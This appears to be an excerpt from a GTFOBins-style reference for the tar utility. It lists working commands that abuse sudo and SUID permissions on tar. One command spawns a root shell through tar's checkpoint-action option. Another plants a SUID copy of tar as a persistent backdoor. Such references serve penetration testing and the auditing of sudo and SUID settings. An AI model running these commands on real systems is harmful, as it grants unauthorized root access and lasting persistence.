***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-
      action=exec=/bin/sh
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * sudo sh -c 'cp $(which tar) .; chmod +s ./tar'

      ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/
      bin/sh
